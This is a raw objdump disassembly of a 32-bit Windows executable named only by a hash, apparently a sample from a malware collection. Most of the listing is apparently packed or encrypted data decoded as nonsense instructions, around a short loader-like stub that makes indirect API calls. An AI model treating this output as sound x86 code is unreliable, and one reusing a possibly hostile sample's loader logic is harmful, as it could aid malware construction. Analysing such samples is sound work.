
10fae93fe86de6d5937cc4902c34384a7689a40525300a9baffd76578df7426a.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	shl    BYTE PTR [edx],1
  401016:	push   edx
  401017:	push   0x7e7e7e7e
  40101c:	xor    BYTE PTR [ecx+0x7e],0x7e
  401020:	into   
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [edi]
  40102d:	add    eax,0xf3b0f0c
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc1
  4010c7:	test   al,0x72
  4010c9:	loopne 0x401054
  4010cb:	push   ebx
  4010cc:	push   eax
  4010cd:	sub    al,0x0
  4010cf:	mov    ecx,0xf55dab91
  4010d4:	outs   dx,DWORD PTR ds:[esi]
  4010d5:	div    ecx
  4010d7:	jmp    0x49f699d2
  4010dc:	pushf  
  4010dd:	in     eax,0xa6
  4010df:	pop    ds
  4010e0:	inc    ebx
  4010e1:	jmp    0x2a1f3020
  4010e6:	or     eax,0xdb1ce677
  4010eb:	(bad)  
  4010ec:	xchg   edi,eax
  4010ed:	aam    0xaf
  4010ef:	jl     0x401131
  4010f1:	mov    bl,0xf
  4010f3:	daa    
  4010f4:	or     DWORD PTR [esi],0x6c
  4010f7:	(bad)  
  4010f8:	pushf  
  4010f9:	dec    eax
  4010fa:	(bad)  
  4010fc:	(bad)  
  4010fd:	fld    TBYTE PTR [ebx-0x46]
  401100:	ss or  dh,ah
  401103:	test   eax,0xab302312
  401108:	mov    dh,0xa7
  40110a:	sub    dh,ch
  40110c:	mov    DWORD PTR [edi],edi
  40110e:	cmp    edi,DWORD PTR [ebx-0x2b0530d2]
  401114:	cmp    eax,0x666980d3
  401119:	jne    0x4010c4
  40111b:	add    dh,dl
  40111d:	popa   
  40111e:	(bad)  [ebp+0x6d95a19d]
  401124:	push   es
  401125:	js     0x4010cd
  401127:	mov    dh,0xff
  401129:	mov    eax,0xd5789ed
  40112e:	stos   DWORD PTR es:[edi],eax
  40112f:	dec    ebp
  401130:	hlt    
  401131:	push   cs
  401132:	push   ebp
  401133:	loope  0x4010ee
  401135:	push   eax
  401136:	popf   
  401137:	mov    cl,0x5e
  401139:	jno    0x40118f
  40113b:	jecxz  0x401183
  40113d:	jns    0x401129
  40113f:	or     ecx,DWORD PTR [ebx]
  401141:	in     al,0x92
  401143:	out    dx,al
  401144:	mov    ah,0xc0
  401146:	outs   dx,DWORD PTR ds:[esi]
  401147:	imul   eax,esi,0x3a743542
  40114d:	mov    ebp,DWORD PTR [esi+0x74e53e9a]
  401153:	pop    esp
  401154:	xor    eax,0x7208a502
  401159:	push   edi
  40115a:	cmpxchg BYTE PTR [edx+eiz*8+0x4f],ch
  40115f:	out    0xa8,eax
  401161:	shl    BYTE PTR [edi],cl
  401163:	lock xchg edx,eax
  401165:	fisttp WORD PTR [edi]
  401167:	pop    esi
  401168:	jno    0x40118b
  40116a:	icebp  
  40116b:	mov    dl,0x26
  40116d:	loope  0x4011ad
  40116f:	jle    0x6d361a70
  401175:	outs   dx,BYTE PTR ds:[esi]
  401176:	sar    BYTE PTR [ecx+esi*2],1
  401179:	outs   dx,BYTE PTR ds:[esi]
  40117a:	das    
  40117b:	ins    DWORD PTR es:[edi],dx
  40117c:	inc    edx
  40117d:	into   
  40117e:	cmp    eax,0xeb646dc5
  401183:	data16 jecxz 0x4011bc
  401186:	cmp    al,0x0
  401188:	call   0x32eed50b
  40118d:	repnz cmp eax,0xf1e0451a
  401193:	in     eax,dx
  401194:	xchg   DWORD PTR [eax-0xe],eax
  401197:	cld    
  401198:	xchg   esp,eax
  401199:	fdivr  QWORD PTR [esi+ebx*1]
  40119c:	xchg   ecx,eax
  40119d:	fcmovnbe st,st(7)
  40119f:	inc    edi
  4011a0:	or     al,0xbd
  4011a2:	pusha  
  4011a3:	call   0xccac7cc3
  4011a8:	xchg   ebp,eax
  4011a9:	cmp    eax,0x7cdf72c5
  4011ae:	mov    ds:0xc1f5a6a3,eax
  4011b3:	(bad)  
  4011b4:	retf   
  4011b5:	sahf   
  4011b6:	cwde   
  4011b7:	jb     0x4011ff
  4011b9:	lods   al,BYTE PTR ds:[esi]
  4011ba:	cwde   
  4011bb:	jmp    0x4011f3
  4011bd:	mov    bl,0x38
  4011bf:	sbb    al,al
  4011c1:	fnsave [esi+0x4d]
  4011c4:	pop    edi
  4011c5:	out    dx,eax
  4011c6:	push   edi
  4011c7:	imul   esi,DWORD PTR [edx+0x3a],0xffffffca
  4011cb:	dec    edi
  4011cc:	pop    ebx
  4011cd:	pop    ebx
  4011ce:	lods   al,BYTE PTR ds:[esi]
  4011cf:	ret    0xcad5
  4011d2:	out    dx,eax
  4011d3:	sub    eax,eax
  4011d5:	push   ss
  4011d6:	lods   al,BYTE PTR ds:[esi]
  4011d7:	mov    al,0xb6
  4011d9:	fisttp WORD PTR [eax+0x1]
  4011dc:	jnp    0x401168
  4011de:	jae    0x4011a6
  4011e0:	xor    BYTE PTR [edi+0x4952891],bl
  4011e6:	repz push 0xbf131df1
  4011ec:	lds    esp,FWORD PTR [ecx+0x4f]
  4011ef:	mov    edx,0x9913b1a2
  4011f4:	pop    ecx
  4011f5:	fnsave [ebx]
  4011f7:	dec    esi
  4011f8:	dec    edx
  4011f9:	retf   0xca74
  4011fc:	jnp    0x401190
  4011fe:	jb     0x401219
  401200:	and    al,0xa2
  401202:	add    BYTE PTR [ebp+0x4013da06],cl
  401208:	data16 mov ds:0x8478f5cf,al
  40120e:	in     eax,0x9c
  401210:	jmp    0x70eccca1
  401215:	pop    ds
  401216:	jl     0x401225
  401218:	xchg   esp,eax
  401219:	sub    edx,ecx
  40121b:	test   BYTE PTR [edx+0x39cf7f55],cl
  401221:	scas   al,BYTE PTR es:[edi]
  401222:	xor    dh,0xe7
  401225:	daa    
  401226:	adc    eax,ebx
  401228:	fistp  DWORD PTR [esi]
  40122a:	add    ah,BYTE PTR [edi]
  40122c:	mov    al,0x83
  40122e:	mov    ch,0x42
  401230:	rcr    bl,0xc1
  401233:	rol    BYTE PTR [ebx-0x77],cl
  401236:	push   0x4f
  401238:	push   ds
  401239:	or     DWORD PTR [edx],eax
  40123b:	aad    0xa7
  40123d:	add    BYTE PTR ds:0x42c4c59,bh
  401243:	cli    
  401244:	mov    esp,0x9b6e33cd
  401249:	mov    ebx,0x674dfa03
  40124e:	add    eax,0x578ed0d
  401253:	int    0xc
  401255:	in     al,0xfa
  401257:	xor    al,0xa1
  401259:	dec    edi
  40125a:	adc    cl,bh
  40125c:	xchg   esp,eax
  40125d:	pop    edi
  40125e:	cld    
  40125f:	mov    ah,0xab
  401261:	mov    esp,0xea750702
  401266:	mov    eax,ds:0x69ecdd7c
  40126b:	and    al,0xd1
  40126d:	jp     0x40125c
  40126f:	ror    DWORD PTR [edi+0x1b],cl
  401272:	daa    
  401273:	push   ebp
  401274:	or     BYTE PTR [esi-0x1],0x57
  401278:	and    al,0x40
  40127a:	add    esi,DWORD PTR [ebx]
  40127c:	leave  
  40127d:	(bad)  
  40127e:	jge    0x40129a
  401280:	cmp    BYTE PTR [eax+0x2a3aa7f9],0xa
  401287:	jno    0x40129c
  401289:	sar    BYTE PTR [edx+0x11],1
  40128c:	xchg   edi,eax
  40128d:	pop    esi
  40128e:	jmp    FWORD PTR [ebx+esi*2]
  401291:	aas    
  401292:	inc    eax
  401293:	les    ebp,FWORD PTR ds:0xafc6c64
  401299:	les    ebx,FWORD PTR [esi+0x2a]
  40129c:	sub    al,0xe8
  40129e:	sbb    ecx,DWORD PTR cs:[ecx+ebp*8-0x72d597b4]
  4012a6:	xchg   edx,eax
  4012a7:	ss mov ebx,0x5a599e94
  4012ae:	(bad)  
  4012af:	xchg   edi,eax
  4012b0:	scas   eax,DWORD PTR es:[edi]
  4012b1:	iret   
  4012b2:	inc    ebx
  4012b3:	mov    esp,0x58bb2c82
  4012b8:	jno    0x401255
  4012ba:	mov    dl,0x5d
  4012bc:	mov    ah,0x9a
  4012be:	push   ss
  4012bf:	xor    al,0x90
  4012c1:	push   ebx
  4012c2:	ds in  al,dx
  4012c4:	arpl   WORD PTR [edx+0x6],si
  4012c7:	inc    edi
  4012c8:	out    dx,al
  4012c9:	sub    ebp,eax
  4012cb:	clc    
  4012cc:	dec    edi
  4012cd:	pop    eax
  4012ce:	push   ds
  4012cf:	dec    esp
  4012d0:	jge    0x401344
  4012d2:	out    dx,eax
  4012d3:	push   ebp
  4012d4:	push   edi
  4012d5:	jg     0x4012bc
  4012d7:	out    0x64,eax
  4012d9:	mov    bl,0xbb
  4012db:	shr    BYTE PTR [ebx+0x1ba54f2],cl
  4012e1:	push   eax
  4012e2:	mov    bl,0xe5
  4012e4:	inc    edx
  4012e5:	mov    esi,0x5441e91
  4012ea:	xchg   DWORD PTR [esp+eiz*2],ebx
  4012ed:	out    0x70,al
  4012ef:	cmc    
  4012f0:	fmulp  st(4),st
  4012f2:	or     eax,0x8f09c061
  4012f7:	jg     0x401300
  4012f9:	sub    ch,BYTE PTR [ebx+edi*1+0x35]
  4012fd:	scas   eax,DWORD PTR es:[edi]
  4012fe:	mov    edi,DWORD PTR [ebp-0x76]
  401301:	mov    ebp,DWORD PTR [edx]
  401303:	xchg   DWORD PTR [ecx+0x4d],ecx
  401306:	mov    esp,0xa178bc6a
  40130b:	inc    edi
  40130c:	data16 ins BYTE PTR es:[edi],dx
  40130e:	push   ds
  40130f:	jno    0x4012b6
  401311:	enter  0x630c,0x9e
  401315:	call   0x55ab69b5
  40131a:	jg     0x401353
  40131c:	mov    bl,0x9c
  40131e:	cmp    edx,DWORD PTR ds:0x3c56f26e
  401324:	mov    bh,0x64
  401326:	pushf  
  401327:	mov    esi,edi
  401329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40132a:	scas   eax,DWORD PTR es:[edi]
  40132b:	das    
  40132c:	xor    DWORD PTR [eax-0x5d],edi
  40132f:	enter  0xed36,0x67
  401333:	ins    DWORD PTR es:[edi],dx
  401334:	jge    0x401362
  401336:	fsub   DWORD PTR [ecx+0x2875f5e6]
  40133c:	nop
  40133d:	mov    edx,0xb79e2d1f
  401342:	adc    BYTE PTR [ebp+0x71c56ee1],bl
  401348:	hlt    
  401349:	mov    esi,0x9e96ea08
  40134e:	(bad)  
  40134f:	push   eax
  401350:	sub    BYTE PTR [ebp+eax*2-0x4f],dh
  401354:	lock aad 0xa1
  401357:	in     eax,dx
  401358:	cmp    al,0xb4
  40135a:	mov    BYTE PTR [ebx],ch
  40135c:	push   0x7a
  40135e:	cld    
  40135f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401360:	push   ecx
  401361:	sub    eax,0x4012b67
  401366:	in     al,0xfa
  401368:	inc    esp
  401369:	sbb    al,0x53
  40136b:	cmp    eax,0xdb008247
  401370:	add    BYTE PTR [ebx],dh
  401372:	out    0x33,al
  401374:	lock iret 
  401376:	clc    
  401377:	std    
  401378:	aas    
  401379:	xchg   cl,cl
  40137b:	stos   BYTE PTR es:[edi],al
  40137c:	mov    eax,0x3daa72ad
  401381:	(bad)  
  401382:	ret    0x59aa
  401385:	lods   eax,DWORD PTR ds:[esi]
  401386:	add    dl,BYTE PTR [esi-0x66]
  401389:	(bad)  
  40138a:	shl    bl,cl
  40138c:	and    eax,0x288e9e0f
  401391:	mov    ds:0x110f7f32,eax
  401396:	mov    cl,0x49
  401398:	mov    esi,0xd967aa05
  40139d:	lds    ebp,FWORD PTR gs:[edx-0x57]
  4013a1:	fiadd  DWORD PTR [ebx]
  4013a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013a4:	dec    ecx
  4013a5:	or     bh,BYTE PTR [esi]
  4013a7:	arpl   WORD PTR [ebx+0x15],bp
  4013aa:	js     0x401360
  4013ac:	int    0x4c
  4013ae:	in     eax,0xad
  4013b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013b1:	lea    ebx,[esi+0x2cec831a]
  4013b7:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  4013be:	sbb    DWORD PTR ds:0x430586,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42ef20,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42ef20,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42ef20,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42eaec
  401403:	mov    ecx,DWORD PTR ds:0x42ef20
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42ef20,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42ef24
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x430656,0x15
  401428:	cmp    DWORD PTR ds:0x430656,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x430656,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e8e5
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42eaf0
  40145f:	cmp    DWORD PTR ds:0x430656,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x430656
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x430656,ecx
  401479:	mov    ecx,DWORD PTR ds:0x430656
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x430656,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43059a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x7550:0xc48b26e
  4014ab:	xlat   BYTE PTR gs:[ebx]
  4014ad:	cwde   
  4014ae:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b2:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b6:	and    BYTE PTR [edx+0x28b2b9a5],ah
  4014bc:	xchg   ebp,eax
  4014bd:	cld    
  4014be:	test   eax,0xccc0bd4f
  4014c3:	les    edx,FWORD PTR [eax+ebx*1-0x52d4089a]
  4014ca:	fbld   TBYTE PTR [eax+0x1e]
  4014cd:	ficomp WORD PTR [ebx+0x1740e2e6]
  4014d3:	xchg   al,ch
  4014d5:	scas   eax,DWORD PTR es:[edi]
  4014d6:	stos   DWORD PTR es:[edi],eax
  4014d7:	mov    al,BYTE PTR [ecx+0x205c4e03]
  4014dd:	sbb    DWORD PTR [ebx],ebx
  4014df:	enter  0x279b,0x19
  4014e3:	dec    edx
  4014e4:	push   ss
  4014e5:	xor    esp,esi
  4014e7:	xor    eax,0x1c5998db
  4014ec:	sti    
  4014ed:	inc    ebx
  4014ee:	or     ebp,ebx
  4014f0:	ret    
  4014f1:	xor    eax,0xe2590124
  4014f6:	loop   0x40148e
  4014f8:	adc    BYTE PTR [ebp-0x1d],dl
  4014fb:	xchg   esp,edi
  4014fd:	repz push edi
  4014ff:	jns    0x40155e
  401501:	cmp    edi,DWORD PTR [ecx+0x68]
  401504:	test   DWORD PTR [ecx],ebx
  401506:	sub    dl,BYTE PTR [eax+ebx*4]
  401509:	out    dx,eax
  40150a:	mov    ss,WORD PTR [edx+0x7e]
  40150d:	mov    dh,0xbd
  40150f:	js     0x401568
  401511:	mov    edx,0x89b4c583
  401516:	jne    0x4014a1
  401518:	call   0xb4782930
  40151d:	out    dx,eax
  40151e:	in     al,dx
  40151f:	sbb    bh,BYTE PTR [edi]
  401521:	in     al,dx
  401522:	fdivr  st(7),st
  401524:	xchg   dh,ch
  401526:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401527:	mov    al,BYTE PTR [ebp+0x70]
  40152a:	inc    eax
  40152b:	adc    al,BYTE PTR [esi-0x18f353c7]
  401531:	imul   esp,ebp,0x38
  401534:	pop    ds
  401535:	adc    ch,BYTE PTR [esp+ecx*4]
  401538:	mov    BYTE PTR [ebx-0x6c3fa3c9],dl
  40153e:	ror    al,cl
  401540:	jno    0x4014ea
  401542:	ss xchg edi,eax
  401544:	sub    eax,0x68b97227
  401549:	adc    bh,bl
  40154b:	mov    ds:0xb1972f83,eax
  401550:	out    dx,eax
  401551:	dec    ebx
  401552:	mov    ss,WORD PTR [edi-0x679f1d76]
  401558:	call   0x8ea0:0xfbd1913b
  40155f:	gs int3 
  401561:	mov    ah,0xc8
  401563:	dec    edi
  401564:	aaa    
  401565:	(bad)  
  401566:	dec    edx
  401567:	jl     0x40157b
  401569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40156a:	lods   al,BYTE PTR ds:[esi]
  40156b:	test   bl,dh
  40156d:	jecxz  0x401558
  40156f:	add    dl,BYTE PTR [edi-0x73]
  401572:	repnz sbb al,0xbe
  401575:	xor    al,0x4c
  401577:	adc    eax,0xbb12f8e5
  40157c:	sub    dl,BYTE PTR [edi+0x2d3c0086]
  401582:	dec    ecx
  401583:	or     esp,edi
  401585:	or     dh,bh
  401587:	imul   esp,DWORD PTR [edx+0x6e],0x78
  40158b:	mov    ebp,0x55c0fa27
  401590:	adc    cl,al
  401592:	sbb    DWORD PTR [edi-0x53],esi
  401595:	cmc    
  401596:	loope  0x4015e6
  401598:	push   es
  401599:	mov    bl,0xce
  40159b:	aas    
  40159c:	and    DWORD PTR ds:0x1278215,esi
  4015a2:	pop    ecx
  4015a3:	mov    ebx,cr3
  4015a6:	cmp    ch,bl
  4015a8:	dec    ebp
  4015a9:	sbb    eax,0xd8e4ac0a
  4015ae:	es pop eax
  4015b0:	into   
  4015b1:	mov    ebp,0x83192ed6
  4015b6:	pop    ecx
  4015b7:	pop    edx
  4015b8:	mov    ah,0xa
  4015ba:	fs enter 0xb453,0x28
  4015bf:	dec    edx
  4015c0:	inc    ebx
  4015c1:	xlat   BYTE PTR ds:[ebx]
  4015c2:	ss je  0x4015cf
  4015c5:	in     al,dx
  4015c6:	dec    edx
  4015c7:	(bad)  
  4015c8:	pop    eax
  4015c9:	cmp    BYTE PTR [ebx],cl
  4015cb:	jge    0x40155c
  4015cd:	mov    eax,ds:0xc41dd88f
  4015d2:	mov    esi,0xb54e7a0d
  4015d7:	inc    eax
  4015d8:	sub    eax,0xc7611510
  4015dd:	fimul  WORD PTR [ebx+0x78]
  4015e0:	neg    DWORD PTR [eax]
  4015e2:	pop    ds
  4015e3:	sub    DWORD PTR [ebp-0x74520b5b],eax
  4015e9:	sbb    al,0x37
  4015eb:	add    BYTE PTR [eax],al
  4015ed:	xchg   edx,eax
  4015ee:	push   eax
  4015ef:	cwde   
  4015f0:	push   0xffffffa5
  4015f2:	fs stos DWORD PTR es:[edi],eax
  4015f4:	fstp   TBYTE PTR [eax]
  4015f6:	and    DWORD PTR [eax+0x5],edi
  4015f9:	pop    eax
  4015fa:	out    dx,al
  4015fb:	pop    edi
  4015fc:	adc    dl,BYTE PTR [esi-0x6c]
  4015ff:	jo     0x401604
  401601:	sub    ah,BYTE PTR [edx+esi*8]
  401604:	loope  0x4015bf
  401606:	add    al,0x4d
  401608:	push   cs
  401609:	jmp    0x4015be
  40160b:	and    DWORD PTR [eax-0x24],ebx
  40160e:	adc    DWORD PTR [esi+0x3b092525],edi
  401614:	pslld  mm2,QWORD PTR [edi]
  401617:	xor    BYTE PTR [ebx+0x65ffab78],ch
  40161d:	les    ecx,FWORD PTR [edx-0x19]
  401620:	sbb    eax,0xd1791c23
  401625:	push   0x92c3ff94
  40162a:	push   es
  40162b:	pop    ebx
  40162c:	sti    
  40162d:	int3   
  40162e:	mov    esi,0x392bb059
  401633:	push   esp
  401634:	sub    esp,DWORD PTR [edx-0x3bc20eb8]
  40163a:	push   edx
  40163b:	cmp    al,0xeb
  40163d:	icebp  
  40163e:	jb     0x401616
  401640:	mov    dl,0xa9
  401642:	je     0x40160a
  401644:	inc    eax
  401645:	pop    esp
  401646:	stos   BYTE PTR es:[edi],al
  401647:	push   esp
  401648:	(bad)  
  401649:	jno    0x401697
  40164b:	out    0x27,eax
  40164d:	mov    gs,WORD PTR [ebx]
  40164f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401650:	aaa    
  401651:	test   BYTE PTR [eax-0x64dfbbd1],dh
  401657:	mov    ebx,0x85ba204f
  40165c:	fild   DWORD PTR [edi+0x3831687c]
  401662:	jb     0x40168f
  401664:	xor    al,0xa4
  401666:	cmc    
  401667:	push   ebx
  401668:	jp     0x401633
  40166a:	sub    eax,0x990f98c1
  40166f:	test   al,0x77
  401671:	pop    ecx
  401672:	jo     0x401605
  401674:	push   es
  401675:	addr16 ret 0xecd3
  401679:	or     ecx,DWORD PTR [edi*4+0x292441f8]
  401680:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401681:	inc    ecx
  401682:	xor    ecx,edx
  401684:	lock loop 0x401696
  401687:	arpl   WORD PTR [edx],di
  401689:	(bad)  
  40168a:	cmp    eax,0x8835a36
  40168f:	pop    ebx
  401690:	cmp    al,0x3d
  401692:	pop    ecx
  401693:	in     eax,dx
  401694:	pop    es
  401695:	scas   eax,DWORD PTR es:[edi]
  401696:	mov    ds:0x3e014a21,eax
  40169b:	add    ebx,edx
  40169d:	mov    ds:0xda4d759e,eax
  4016a2:	dec    esi
  4016a3:	in     al,dx
  4016a4:	popf   
  4016a5:	in     eax,dx
  4016a6:	in     eax,0x6e
  4016a8:	xchg   ecx,eax
  4016a9:	paddb  mm2,QWORD PTR [edx-0x4f]
  4016ad:	add    bh,BYTE PTR [edi]
  4016af:	mov    dl,0x8d
  4016b1:	ja     0x4016a2
  4016b3:	jmp    0x1222:0xb06bc88d
  4016ba:	pusha  
  4016bb:	adc    bl,BYTE PTR [ebp+0x4c9d8c51]
  4016c1:	retf   
  4016c2:	mov    bh,ah
  4016c4:	mov    ds:0xda8dd71a,eax
  4016c9:	test   BYTE PTR [eax+0x16],ah
  4016cc:	mov    al,ds:0x4f43120
  4016d1:	outs   dx,DWORD PTR ds:[esi]
  4016d2:	out    0x6a,al
  4016d4:	adc    BYTE PTR [edi],dl
  4016d6:	xchg   ecx,eax
  4016d7:	ds inc ebx
  4016d9:	inc    edx
  4016da:	mov    dh,0x1b
  4016dc:	loop   0x4016df
  4016de:	rcr    DWORD PTR [edi],1
  4016e0:	mov    ebp,0x7171b3e
  4016e5:	mov    esi,0xb1bd110d
  4016ea:	idiv   BYTE PTR [esi+eiz*2+0x5947a9b2]
  4016f1:	(bad)  
  4016f2:	mov    bh,0x14
  4016f4:	adc    eax,0x595a0eb
  4016f9:	imul   esp,edx,0xf331ebbc
  4016ff:	out    0x80,al
  401701:	inc    esp
  401702:	jmp    0x40169e
  401704:	idiv   BYTE PTR [ebx+0x53737003]
  40170a:	test   eax,0x490031bb
  40170f:	mov    cl,0x7
  401711:	add    al,0x7d
  401713:	push   edx
  401714:	or     al,0x59
  401716:	add    BYTE PTR [ecx-0x2b3db6cb],ah
  40171c:	adc    DWORD PTR [eax-0x18],esp
  40171f:	adc    BYTE PTR [ecx-0x74],bh
  401722:	adc    edx,DWORD PTR [ebx+ecx*8-0x22]
  401726:	mov    bl,BYTE PTR [edx-0x28]
  401729:	inc    edi
  40172a:	add    DWORD PTR [eax+0x7d],edi
  40172d:	fs std 
  40172f:	xchg   esp,eax
  401730:	gs fwait
  401732:	dec    ebp
  401733:	adc    al,BYTE PTR [ecx+0x14]
  401736:	shl    esi,cl
  401738:	stos   DWORD PTR es:[edi],eax
  401739:	mov    edi,0xe37a220a
  40173e:	and    BYTE PTR [ebx+0x1a],bl
  401741:	test   al,0x64
  401743:	pusha  
  401744:	cli    
  401745:	push   0x2b53d457
  40174a:	inc    esp
  40174b:	pop    eax
  40174c:	sti    
  40174d:	xchg   esp,eax
  40174e:	xchg   ecx,eax
  40174f:	dec    eax
  401750:	dec    esp
  401751:	stos   BYTE PTR es:[edi],al
  401752:	in     eax,dx
  401753:	xchg   DWORD PTR [edi-0x30],edx
  401756:	stos   DWORD PTR es:[edi],eax
  401757:	inc    ebp
  401758:	and    DWORD PTR [eax+0x15a28c23],ecx
  40175e:	mov    al,0x4f
  401760:	dec    esi
  401761:	sub    al,0x2e
  401763:	xchg   BYTE PTR [edx+ebx*1-0x464d1c0a],dh
  40176a:	or     al,0x1e
  40176c:	dec    ebx
  40176d:	mov    ds:0x50c7b799,eax
  401772:	mov    eax,ds:0xf39bfe3a
  401777:	pop    ss
  401778:	inc    edi
  401779:	or     ebp,DWORD PTR [ebx+0x21]
  40177c:	mov    dh,0x63
  40177e:	pop    ss
  40177f:	inc    ecx
  401780:	push   cs
  401781:	sub    eax,esi
  401783:	fs jns 0x401749
  401786:	dec    ebp
  401787:	(bad)  
  401788:	push   edx
  401789:	pop    ebp
  40178a:	mov    ds:0x476a59a7,al
  40178f:	mov    cl,0xa
  401791:	and    al,0x87
  401793:	add    eax,edi
  401795:	or     eax,0x555c3c8
  40179a:	test   al,0x62
  40179c:	std    
  40179d:	xchg   DWORD PTR [edi+0x205d81f9],ebx
  4017a3:	aaa    
  4017a4:	mov    BYTE PTR ds:0xf26b682e,0x13
  4017ab:	cmp    eax,0xcb58ac5a
  4017b0:	call   0xc090:0x2661061
  4017b7:	loopne 0x4017de
  4017b9:	in     al,0xfe
  4017bb:	aas    
  4017bc:	sub    al,bh
  4017be:	sub    DWORD PTR [eax],ebx
  4017c0:	mov    dh,0x23
  4017c2:	test   eax,0xcc46746e
  4017c7:	fdiv   st,st(4)
  4017c9:	xchg   DWORD PTR [ebp+ecx*4+0x7facb3b3],eax
  4017d0:	xchg   ecx,eax
  4017d1:	(bad)  
  4017d2:	fdiv   QWORD PTR [ebx-0x40c586cf]
  4017d8:	rol    BYTE PTR [edi],cl
  4017da:	inc    ebp
  4017db:	inc    ebp
  4017dc:	ret    
  4017dd:	xchg   ecx,eax
  4017de:	jle    0x401807
  4017e0:	retf   0xe08c
  4017e3:	dec    esp
  4017e4:	mov    ecx,0x1db6f264
  4017e9:	cmp    edx,edi
  4017eb:	daa    
  4017ec:	rcr    DWORD PTR [ecx+0xb7aa6e6],cl
  4017f2:	hlt    
  4017f3:	mov    ecx,0x9d6fefc6
  4017f8:	or     al,0xbf
  4017fa:	inc    ebx
  4017fb:	add    eax,0xb8c8e25e
  401800:	and    ch,BYTE PTR [edi]
  401802:	loop   0x4017f2
  401804:	xchg   ebx,eax
  401805:	out    dx,eax
  401806:	pop    esp
  401807:	sbb    eax,0xeed67c43
  40180c:	mov    ebp,0xefb21d7c
  401811:	or     al,0x66
  401813:	pop    eax
  401814:	jne    0x4017d3
  401816:	sbb    BYTE PTR [ecx+0x24c01053],bl
  40181c:	mov    eax,0x45e4d81a
  401821:	push   ebp
  401822:	aas    
  401823:	push   ss
  401824:	mov    esp,0x227a1c2b
  401829:	sub    al,0xc2
  40182b:	push   ebp
  40182c:	add    BYTE PTR [eax+0xb],dh
  40182f:	sbb    BYTE PTR [eax+edx*2-0x3d],0xd1
  401834:	(bad)  
  401835:	xchg   ebx,eax
  401836:	mov    ds:0x33a518d6,al
  40183b:	test   DWORD PTR [edi-0x13],esi
  40183e:	loop   0x401887
  401840:	inc    edx
